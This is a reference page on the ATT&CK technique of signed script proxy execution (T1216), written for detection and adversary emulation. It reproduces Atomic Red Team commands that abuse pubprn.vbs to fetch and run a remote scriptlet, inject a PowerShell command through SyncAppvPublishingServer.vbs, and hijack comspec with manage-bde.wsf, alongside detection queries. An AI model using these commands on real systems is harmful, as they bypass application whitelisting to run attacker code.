
# Signed Script Proxy Execution

## Description

### MITRE Description

> Scripts signed with trusted certificates can be used to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application whitelisting solutions that do not account for use of these scripts.

PubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site. (Citation: Enigma0x3 PubPrn Bypass) Example command: <code>cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png</code>

There are several other signed scripts that may be used in a similar manner. (Citation: GitHub Ultimate AppLocker Bypass List)

## Aliases

```

```

## Additional Attributes

* Bypass: ['Application whitelisting', 'Digital Certificate Validation']
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1216

## Potential Commands

```
cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/src/T1216.sct"

C:\windows\system32\SyncAppvPublishingServer.vbs "\n;Start-Process calc"

set comspec=C:\Windows\System32\calc.exe
cscript manage-bde.wsf

PubPrn.vbsPubPrn.vbs
```

## Commands Dataset

```
[{'command': 'cscript.exe /b '
             'C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs '
             'localhost '
             '"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/src/T1216.sct"\n',
  'name': None,
  'source': 'atomics/T1216/T1216.yaml'},
 {'command': 'C:\\windows\\system32\\SyncAppvPublishingServer.vbs '
             '"\\n;Start-Process calc"\n',
  'name': None,
  'source': 'atomics/T1216/T1216.yaml'},
 {'command': 'set comspec=C:\\Windows\\System32\\calc.exe\n'
             'cscript manage-bde.wsf\n',
  'name': None,
  'source': 'atomics/T1216/T1216.yaml'},
 {'command': 'PubPrn.vbsPubPrn.vbs',
  'name': None,
  'source': 'SysmonHunter - Signed Script Proxy Execution'}]
```

## Potential Detections

```json
[{'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']}]
```

## Potential Queries

```json
[{'name': 'Signed Script Proxy Execution',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where process_path contains "cscript"or process_path '
           'contains "wscript"or process_path contains "certutil"or '
           'process_path contains "jjs"and file_directory !contains " /nologo '
           '\\"MonitorKnowledgeDiscovery.vbs\\""'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Signed Script Proxy Execution': {'atomic_tests': [{'auto_generated_guid': '9dd29a1f-1e16-4862-be83-913b10a88f6c',
                                                                             'description': 'Executes '
                                                                                            'the '
                                                                                            'signed '
                                                                                            'PubPrn.vbs '
                                                                                            'script '
                                                                                            'with '
                                                                                            'options '
                                                                                            'to '
                                                                                            'download '
                                                                                            'and '
                                                                                            'execute '
                                                                                            'an '
                                                                                            'arbitrary '
                                                                                            'payload.\n',
                                                                             'executor': {'command': 'cscript.exe '
                                                                                                     '/b '
                                                                                                     'C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs '
                                                                                                     'localhost '
                                                                                                     '"script:#{remote_payload}"\n',
                                                                                          'elevation_required': False,
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'remote_payload': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/src/T1216.sct',
                                                                                                                    'description': 'A '
                                                                                                                                   'remote '
                                                                                                                                   'payload '
                                                                                                                                   'to '
                                                                                                                                   'execute '
                                                                                                                                   'using '
                                                                                                                                   'PubPrn.vbs.',
                                                                                                                    'type': 'Url'}},
                                                                             'name': 'PubPrn.vbs '
                                                                                     'Signed '
                                                                                     'Script '
                                                                                     'Bypass',
                                                                             'supported_platforms': ['windows']},
                                                                            {'auto_generated_guid': '275d963d-3f36-476c-8bef-a2a3960ee6eb',
                                                                             'description': 'Executes '
                                                                                            'the '
                                                                                            'signed '
                                                                                            'SyncAppvPublishingServer '
                                                                                            'script '
                                                                                            'with '
                                                                                            'options '
                                                                                            'to '
                                                                                            'execute '
                                                                                            'an '
                                                                                            'arbitrary '
                                                                                            'PowerShell '
                                                                                            'command.\n'
                                                                                            'Upon '
                                                                                            'execution, '
                                                                                            'calc.exe '
                                                                                            'will '
                                                                                            'be '
                                                                                            'launched.\n',
                                                                             'executor': {'command': 'C:\\windows\\system32\\SyncAppvPublishingServer.vbs '
                                                                                                     '"\\n;#{command_to_execute}"\n',
                                                                                          'elevation_required': False,
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'command_to_execute': {'default': 'Start-Process '
                                                                                                                                   'calc',
                                                                                                                        'description': 'A '
                                                                                                                                       'PowerShell '
                                                                                                                                       'command '
                                                                                                                                       'to '
                                                                                                                                       'execute.',
                                                                                                                        'type': 'string'}},
                                                                             'name': 'SyncAppvPublishingServer '
                                                                                     'Signed '
                                                                                     'Script '
                                                                                     'PowerShell '
                                                                                     'Command '
                                                                                     'Execution',
                                                                             'supported_platforms': ['windows']},
                                                                            {'auto_generated_guid': '2a8f2d3c-3dec-4262-99dd-150cb2a4d63a',
                                                                             'description': 'Executes '
                                                                                            'the '
                                                                                            'signed '
                                                                                            'manage-bde.wsf '
                                                                                            'script '
                                                                                            'with '
                                                                                            'options '
                                                                                            'to '
                                                                                            'execute '
                                                                                            'an '
                                                                                            'arbitrary '
                                                                                            'command.\n',
                                                                             'executor': {'cleanup_command': 'set '
                                                                                                             'comspec=C:\\Windows\\System32\\cmd.exe\n',
                                                                                          'command': 'set '
                                                                                                     'comspec=#{command_to_execute}\n'
                                                                                                     'cscript '
                                                                                                     'manage-bde.wsf\n',
                                                                                          'elevation_required': False,
                                                                                          'name': 'command_prompt'},
                                                                             'input_arguments': {'command_to_execute': {'default': 'C:\\Windows\\System32\\calc.exe',
                                                                                                                        'description': 'A '
                                                                                                                                       'command '
                                                                                                                                       'to '
                                                                                                                                       'execute.',
                                                                                                                        'type': 'Path'}},
                                                                             'name': 'manage-bde.wsf '
                                                                                     'Signed '
                                                                                     'Script '
                                                                                     'Command '
                                                                                     'Execution',
                                                                             'supported_platforms': ['windows']}],
                                                           'attack_technique': 'T1216',
                                                           'display_name': 'Signed '
                                                                           'Script '
                                                                           'Proxy '
                                                                           'Execution'}},
 {'SysmonHunter - T1216': {'description': None,
                           'level': 'high',
                           'name': 'Signed Script Proxy Execution',
                           'phase': 'Execution',
                           'query': [{'file': {'path': {'pattern': 'PubPrn.vbs'}},
                                      'process': {'any': {'pattern': 'PubPrn.vbs'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Execution](../tactics/Execution.md)
    

# Mitigations

None

# Actors


* [APT32](../actors/APT32.md)

